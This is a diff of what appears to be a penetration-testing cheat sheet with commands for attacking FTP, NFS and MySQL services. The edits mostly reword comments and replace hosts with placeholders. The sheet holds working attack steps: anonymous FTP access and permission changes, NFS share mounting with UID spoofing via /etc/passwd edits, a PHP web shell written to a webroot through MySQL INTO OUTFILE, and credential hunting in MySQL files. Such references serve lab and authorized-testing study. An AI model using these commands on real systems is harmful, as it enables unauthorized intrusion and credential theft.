@@ -46,15 +46,15 @@ wireshark -> open PCAP file
 ### 21 - FTP *
 
 ```bash
-#Anonymous login, file read/write privilege, listing/navigation, quick RCE, set permissions
+#Anonymous login, file read/write privilege, listing/navigation, quick RCE, set full permissions
 sudo ftp -p [IP] [PORT] + anonymous:pass
 get/put [file]
 ls, cd, pwd
 system whoami; ()
-chmod 777 shells.php
+chmod 777 [file]
 
 #Recursive wget
-wget --mirror 'ftp://[USER]:[PASS]@10.10.10.59'
+wget --mirror 'ftp://[USER]:[PASS]@[TARGET]'
 
 #Config file + common root paths
 /etc/vsftpd.conf (proftpd.conf, ftp.conf, ftpusers)
@@ -522,12 +522,11 @@ nmap -sV -p 111 --script=nfs* [IP]
 
 #If mountd is visible (873 / 20048) -> look shares -> no_root_squash?
 showmount -e [IP]
-[if root shares -> setuid(0) C file in share with u+s perms -> execute from victim session]
 
 #Mount a share
 mount -t nfs [IP]:[SHARE] /tmp/nsf_share -o nolock
 
-#Try Read Files (create user pwn:pwn with the corresponding uid)
+#Try to read files (create user pwn:pwn with the corresponding uid)
 sudo adduser pwn
 sudo sed -i -e 's/[PREV_UID]/[NEW_UID]/g' /etc/passwd
 su pwn
@@ -664,7 +663,7 @@ describe <table_name>;
 select load_file('[FILE/PATH]');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
 
-#Files with credentials
+#Fcredential hunting
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 cat /etc/mysql/debian.cnf
 
